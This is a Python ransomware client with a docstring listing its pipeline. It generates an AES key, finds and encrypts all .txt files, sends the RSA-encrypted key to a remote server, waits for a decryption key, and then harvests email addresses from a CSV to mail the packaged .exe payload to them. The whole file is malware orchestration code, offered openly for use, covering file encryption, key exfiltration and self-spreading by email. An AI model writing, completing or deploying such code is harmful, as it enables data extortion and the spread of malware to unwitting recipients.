"""
how the pipeline works (when you run the client.exe file):
1. generate 16 character key [OK]
2. find all .txt files on the system [OK]
3. encrypt the files with the key using AES-CBC [Pending] <----------------
4. save the 16char key to a file on the desktop (Key.key) [OK]
5. generate RSA key pair [OK]
6. save the public/private key to a file on the desktop (keyPair.key) [OK]
7. encrypt the 16char key with the public key [OK] 
8. save the encrypted 16char to a file on the desktop (encryptedKey.key) [OK]
9. send the encrypted 16char key to the server [OK]
10. access the csv file and extract emails from it [OK]
11. convert the client.py to .exe file auto-py-to-exe library [OK] <----------------
12. send the .exe file to the emails on the csv file [Pending] <----------------
13. when the .exe file is run, a prompt should popup indicating that the encryption is in progress [Pending] <----------------
14. After encrypting all txt files, the prompt will wait for a 
    key input in order to decrypt the files back. "Enter Key to decrypt" [Pending] <----------------
15. After the key is entered, the files will be decrypted and the prompt will close [Pending] <----------------
"""
from utils import waitingForKey, generate_key, findTxtFileAndSaveThemTo, encrypt_ascii_key_with_server_RSA_and_send_to_server, encrypt_file_paths, saveKey, decrypt_file_paths, get_emails_from_csv, send_to_emails

# Continue with the rest of your program logic
waitingForKey("start")

#1
# ascii_key= "vG7pyhyrDzSnqcJ8"
ascii_key = generate_key(16)
print("ascii_key vvvv" + ascii_key)

#2
file_contains_paths ="paths.txt"
findTxtFileAndSaveThemTo( file_contains_paths )

#3
encoded_encrypted_msg, credentials, payload_url = encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key)
print("credentials" + str(credentials))
print("payload_url" + str(payload_url))
#4
encrypt_file_paths(ascii_key, file_contains_paths)

#5
saveKey(ascii_key, "Key.key")

#6
saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")

#7
waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
decrypt_file_paths(ascii_key, file_contains_paths)

# 8
emails = get_emails_from_csv()



print(emails)
# 9
send_to_emails(emails, credentials, payload_url)
print("Payload was sent successfully!")
input("Press Any Key To Close...")